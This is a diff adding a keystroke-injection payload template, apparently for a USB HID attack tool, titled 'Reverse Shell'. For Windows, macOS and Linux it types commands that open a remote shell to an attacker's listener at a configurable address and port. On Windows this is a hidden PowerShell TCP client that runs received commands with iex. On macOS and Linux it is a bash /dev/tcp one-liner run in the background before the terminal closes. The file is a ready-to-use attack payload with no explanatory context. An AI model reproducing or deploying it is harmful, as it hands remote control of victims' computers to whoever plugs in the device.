@@ -1,0 +1,34 @@
+NAME Reverse Shell
+DESCRIPTION Opens a reverse shell to the attacker's listener
+CATEGORY exploit
+PLATFORMS WIN,MAC,LINUX
+OPTION LHOST 192.168.1.100 "Attacker IP address"
+OPTION LPORT 4444 "Listener port"
+OPTION DELAY 2000 "Initial HID enumeration delay (ms)"
+PLATFORM WIN
+DELAY {{DELAY}}
+GUI r
+DELAY 800
+STRING powershell -nop -w hidden -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
+ENTER
+PLATFORM MAC
+DELAY {{DELAY}}
+GUI SPACE
+DELAY 700
+STRING Terminal
+ENTER
+DELAY 1400
+STRING bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1 &
+ENTER
+DELAY 500
+STRING exit
+ENTER
+PLATFORM LINUX
+DELAY {{DELAY}}
+CTRL ALT t
+DELAY 1400
+STRING bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1 &
+ENTER
+DELAY 500
+STRING exit
+ENTER
